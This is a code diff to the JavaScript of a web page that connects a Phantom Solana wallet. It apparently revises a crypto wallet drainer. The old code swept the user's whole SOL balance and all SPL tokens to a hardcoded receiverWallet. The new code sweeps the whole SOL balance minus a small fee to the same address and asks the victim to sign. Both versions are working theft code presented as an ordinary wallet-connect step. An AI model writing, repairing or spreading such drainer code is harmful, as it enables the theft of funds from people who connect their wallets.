@@ -24,7 +24,7 @@
                 window.location.href = mobileLink;
             } else {
                 if (!window.solana) {
-                    alert("Phantom wallet not found. Please install the extension.");
+                    alert("Phantom wallet not found. Please install it.");
                     return;
                 }
 
@@ -37,59 +37,28 @@
                     );
 
                     const publicKey = provider.publicKey;
-                    alert(`Connected to wallet: ${publicKey.toBase58()}`);
+                    alert("Connected wallet: " + publicKey.toBase58());
 
-                    // Get all token accounts for the user
-                    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
-                        programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
-                    });
-
-                    let transaction = new solanaWeb3.Transaction();
-
-                    // Add SOL transfer
                     const balance = await connection.getBalance(publicKey);
-                    if (balance > 0) {
-                        transaction.add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: publicKey,
-                                toPubkey: new solanaWeb3.PublicKey(receiverWallet),
-                                lamports: balance - 5000, // Transfer all SOL, leaving some for fees
-                            })
-                        );
-                    }
-
-                    // Add SPL token transfers
-                    tokenAccounts.value.forEach(tokenAccount => {
-                        const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
-                        if (tokenAmount > 0) {
-                            const tokenMintAddress = tokenAccount.account.data.parsed.info.mint;
-                            const tokenPubkey = new solanaWeb3.PublicKey(tokenMintAddress);
-                            transaction.add(
-                                solanaWeb3.Token.createTransferInstruction(
-                                    new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-                                    tokenAccount.pubkey,
-                                    new solanaWeb3.PublicKey(receiverWallet),
-                                    publicKey,
-                                    [],
-                                    tokenAmount * Math.pow(10, tokenAccount.account.data.parsed.info.tokenAmount.decimals)
-                                )
-                            );
-                        }
-                    });
-
-                    if (transaction.instructions.length === 0) {
-                        alert("No funds available to transfer.");
+                    if (balance <= 5000) {
+                        alert("Insufficient SOL balance.");
                         return;
                     }
 
-                    // Send transaction to Phantom for approval
-                    const signature = await provider.signAndSendTransaction(transaction);
-                    alert(`Transaction sent with signature: ${signature.signature}`);
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: publicKey,
+                            toPubkey: new solanaWeb3.PublicKey(receiverWallet),
+                            lamports: balance - 5000,  // Transfer all SOL, leaving a small fee
+                        })
+                    );
 
-                    await connection.confirmTransaction(signature.signature);
+                    const { signature } = await provider.signAndSendTransaction(transaction);
+                    alert("Transaction sent! Signature: " + signature);
+                    await connection.confirmTransaction(signature);
                     alert("Transaction confirmed!");
                 } catch (error) {
-                    console.error("Error during transfer:", error);
+                    console.error("Error:", error);
                     alert("Error: " + error.message);
                 }
             }
